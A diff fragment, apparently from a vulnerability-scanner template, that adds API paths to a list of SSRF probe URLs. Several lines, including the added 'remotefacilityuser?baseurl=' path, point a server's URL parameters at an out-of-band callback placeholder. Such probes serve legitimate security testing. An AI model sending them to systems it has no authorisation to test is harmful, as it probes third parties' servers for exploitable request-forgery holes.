@@ -112,3 +112,5 @@
 /auth
 /api/public/stream?url=http://{{interactsh-url}}/x.mp4
 /public/stream?url=http://{{interactsh-url}}/x.mp4
+/api/public/info/
+/api/auth/remotefacilityuser?baseurl=http://{{interactsh-url}}&username={{randstr}}&facility={{randstr}}
